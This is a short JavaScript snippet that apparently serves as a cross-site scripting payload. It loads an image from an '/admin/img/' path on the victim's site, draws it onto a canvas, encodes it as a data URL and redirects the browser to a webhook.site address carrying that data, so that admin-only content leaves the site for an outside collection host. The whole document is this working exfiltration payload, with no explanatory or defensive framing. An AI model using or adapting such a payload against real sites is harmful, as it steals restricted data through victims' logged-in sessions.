var img=new Image;
img.crossOrigin='Anonymous';
img.src='/admin/img/175193053491407376ff47dc6e834673.png';
setTimeout(function(){
	var c=document.createElement('canvas');
	c.height=img.naturalHeight;
	c.width=img.naturalWidth;
	var ctx=c.getContext('2d');
	ctx.drawImage(img,0,0,c.width,c.height);
	window.location=encodeURI('https://webhook.site/5148d880-fcfd-42dd-b595-af23e42c3c4a/?x='.concat(c.toDataURL()));
},3000);